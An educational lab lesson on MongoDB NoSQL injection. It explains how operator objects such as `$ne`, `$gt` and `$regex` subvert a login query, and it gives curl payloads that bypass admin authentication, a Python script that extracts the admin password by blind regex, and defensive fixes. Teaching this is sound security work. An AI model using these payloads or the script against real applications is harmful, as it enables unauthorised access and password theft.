# NoSQL Injection — MongoDB Operator Bypass

> **Difficulty:** Medium — **Level:** intermediate

## Introduction

Not every database uses SQL. **NoSQL** (MongoDB, CouchDB...) uses **JSON** as its query language. NoSQL Injection happens when an app **injects your input directly into the JSON query** without validation — you can add **special operators** like `$ne` (not equal), `$gt` (greater than), `$regex` to flip auth logic or steal data. It falls under **A03 Injection**.

---

## Part A — Understand

### SQL vs NoSQL

| | SQL | NoSQL (MongoDB) |
|---|---|---|
| Language | SQL string | JSON object |
| Query | `WHERE username='x'` | `{ username: 'x' }` |
| Injection | Escape a string | Insert an **operator** into JSON |

### How the app gets vulnerable

Vulnerable login code (Node.js + MongoDB):

```js
// VULNERABLE: input mixed straight into the query object
db.users.findOne({ username: user, password: pass });
```

You send a JSON body:

```json
{ "username": "admin", "password": "whatever" }
```

Now change password to an **operator object**:

```json
{ "username": "admin", "password": { "$ne": "invalid" } }
```

The query becomes:

```js
db.users.findOne({ username: "admin", password: { $ne: "invalid" } });
// Means: password DIFFERS from "invalid" → ALWAYS TRUE for admin
```

→ Log in as admin with no password!

> **Intuition:** The app asks the DB "is the password equal to this?". You rewrite the question as "is the password different from this?" (`$ne`) — of course it is. Operators are "control keywords" you inject into the question.

### Key operators

| Operator | Meaning | Use it to |
|----------|---------|-----------|
| `$ne` | Not equal | Bypass login |
| `$gt` / `$gte` | Greater than / >= | Grab first user, exceed ranges |
| `$lt` / `$lte` | Less than / <= | Reverse conditions |
| `$regex` | Regular-expression match | Extract chars one by one (blind) |
| `$exists` | Field exists | Check a field |
| `$where` | Run server-side JS | Blind boolean (slow) |
| `$in` | In a set | Bypass with multiple values |

---

## Part B — Exploit: NoSQLi Lab

### Step 1: Start the lab

```bash
cd nosql-injection/lab
docker compose up -d

> 💡 **Get Lab Link:** Open this lesson on **Learning Detail** → click **"Access Lab"** to get the real link (e.g., `https://vuln.ghedahaui.online/labs-env/...`). Replace `<LAB_ADDRESS>` with that link in commands below.

# Lab at: <LAB_ADDRESS>
```

The lab is a login API (Node.js + Express + MongoDB) accepting JSON at `POST /api/login`. The `users` collection holds `admin` (hashed password) and `guest`.

<!-- IMG: Login page of the NoSQL lab (step 1). File: nosql-injection_01_login_page.png -->

### Step 2: Confirm the app uses JSON

```bash
$ curl -s <LAB_ADDRESS>/api/login -X POST \
       -H "Content-Type: application/json" \
       -d '{"username":"guest","password":"guest123"}'
{"success":true,"role":"user"}
```

<!-- IMG: Valid guest login returning JSON (step 2). File: nosql-injection_02_valid_login.png -->

> **Explain:** JSON response + JSON body → candidate for NoSQLi (MongoDB queries with JSON objects).

### Step 3: Bypass with `$ne` — login as admin, no password

```bash
$ curl -s <LAB_ADDRESS>/api/login -X POST \
       -H "Content-Type: application/json" \
       -d '{"username":"admin","password":{"$ne":""}}'
{"success":true,"role":"admin","flag":"FLAG{n0sql_0p3r4t0r_2026}"}
```

<!-- IMG: $ne bypass response logging in as admin with flag (step 3). File: nosql-injection_03_ne_bypass.png -->

> **Explain:** `{ "$ne": "" }` = "password differs from empty string" → true for any real password → admin login succeeds. You changed the **structure of the question**, not just a value.

### Step 4: Try `$gt` and `$regex`

```bash
# $gt: password > "" (any non-empty string) — same bypass
$ curl -s <LAB_ADDRESS>/api/login -X POST \
       -H "Content-Type: application/json" \
       -d '{"username":"admin","password":{"$gt":""}}'

# $regex: password contains the letter a (anything + a + anything)
$ curl -s <LAB_ADDRESS>/api/login -X POST \
       -H "Content-Type: application/json" \
       -d '{"username":"admin","password":{"$regex":".*a.*"}}'
```

<!-- IMG: Two successful $gt and $regex bypasses (step 4). File: nosql-injection_04_gt_regex.png -->

### Step 5: Steal data with `$regex` extraction

Just like blind SQLi — ask for each password char:

```bash
# First char is 'f'?
$ curl -s <LAB_ADDRESS>/api/login -X POST \
       -H "Content-Type: application/json" \
       -d '{"username":"admin","password":{"$regex":"^f"}}'
```

<!-- IMG: Testing ^f correct char returns success (step 5). File: nosql-injection_05_regex_extract.png -->

> **Explain:** `$regex: "^f"` = "password starts with the letter f". If true → login succeeds. Try `^a`, `^b`... to find the first char, then `^fa`, `^fb`... for the second. You just recreated "blind boolean" in NoSQL.

### Step 6: Automate extraction with a script

```python
import requests, string

url = "<LAB_ADDRESS>/api/login"
charset = string.ascii_lowercase + string.digits + "_{}@.-"
password = ""
for i in range(1, 40):
    for c in charset:
        data = {"username": "admin", "password": {"$regex": f"^{password}{c}"}}
        r = requests.post(url, json=data)
        if r.json().get("success"):
            password += c
            print(f"[{i}] {password}")
            break
    else:
        break
print("PASSWORD:", password)
```

<!-- IMG: Python script extracting the admin password char by char (step 6). File: nosql-injection_06_extract_script.png -->

> **Explain:** The loop grows the regex `^fa...` step by step: keep a char only when login succeeds. Result is the admin password — use it to log in as a normal user and see all privileges.

---

## Part C — Defend

### Fixes

1. **Never feed raw objects into a query.** Read fields, cast types:

```js
const username = String(req.body.username ?? '');
const password = String(req.body.password ?? '');
db.users.findOne({ username, password });
```

2. **Validate schema** — use `express-validator` or declare typed fields (string).
3. **In MongoDB use `$` deliberately:** if operators aren't needed, don't let users send objects.
4. **Hash passwords + rate limit logins.**

### Quick test checklist

```text
[ ] {"username":"admin","password":{"$ne":""}}  → bypass?
[ ] {"$gt":""}  /  {"$gt":"a"}  → exceeds condition?
[ ] {"$regex":".*"}  → always true?
[ ] {"$exists":false}  → field missing?
[ ] Other content-types — does a URL-encoded field get parsed into an object?
[ ] Extract data with {"$regex":"^..."}
```

---
